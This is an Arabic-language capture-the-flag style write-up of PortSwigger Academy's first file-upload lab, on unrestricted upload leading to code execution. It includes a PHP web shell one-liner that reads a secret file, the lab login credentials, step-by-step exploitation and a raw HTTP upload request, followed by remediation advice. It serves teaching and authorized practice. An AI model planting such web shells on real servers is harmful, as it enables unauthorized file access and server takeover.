# Lab 01 — Remote Code Execution via Web Shell Upload (تنفيذ الأوامر عبر رفع ويب شل مباشر)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20—%20No%20Validation%20(غياب%20الفحص%20والتصفية)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 01 — Remote Code Execution via Web Shell Upload (تنفيذ الأوامر عبر رفع ويب شل مباشر) |
| **تصنيف الثغرة** | File Upload — No Validation (غياب الفحص والتصفية) |
| **معيار الضعف (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | رفع ويب شل PHP مباشر واستخدامه لقراءة محتوى الملف السري /home/carlos/secret. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يوفر حساب المستخدم ميزة رفع صورة شخصية (Avatar). 
عندما يرفع المستخدم ملفاً، يقوم التطبيق بحفظه مباشرة داخل مجلد الويب العام: `/files/avatars/`.

**الخلل الفكري هنا:** لا توجد أي قيود على نوع الملف المرفوع! لا فحص للامتداد، ولا فحص لنوع المحتوى. يستطيع المستخدم رفع ملف بامتداد `.php` يحتوي على كود لقراءة الملفات:
`<?php echo file_get_contents('/home/carlos/secret'); ?>`.
بمجرد فتح رابط الصورة في المتصفح، يتعامل خادم الويب (Apache) مع الملف ككود برمجي وينفذه فوراً ويعرض السر المطلوب!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يرفع ملف سكربت تنفيذي `.php` مباشرة في مجلد متاح على الويب لتنفيذه عبر المتصفح.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
غياب أي تحقق من نوع أو امتداد الملفات المرفوعة مع حفظها داخل مجلد يتيح خادم الويب تنفيذ السكربتات بداخله.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك بحساب `wiener:peter`.
2. أنشئ ملفاً على جهازك باسم `shell.php` وضع بداخله الكود التالي:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
3. في صفحة الحساب الشخصي، اختر ملف `shell.php` واضغط **Upload avatar**.
4. سيتم رفع الملف بنجاح. ارجع لصفحة الحساب وافحص كود مصدر الصورة لمعرفة مسار حفظها.
5. ستجد رابط الصورة يشير إلى: `/files/avatars/shell.php`.
6. افتح الرابط في المتصفح: سيقوم السيرفر بتشغيل كود الـ PHP وعرض محتوى السر كاملاً!
7. انسخ السر واضغط **Submit solution** لإنهاء اللاب.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

The file avatars/shell.php has been uploaded.
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تنفيذ أوامر وتحكم كامل بالسيرفر (RCE) عبر رفع ملفات تنفيذية خبيثة دون قيود.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

حظر رفع أي ملف يحمل امتداداً تنفيذياً، وتعطيل تنفيذ مفسر PHP داخل مجلد الرفع (`php_admin_flag engine off`).

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
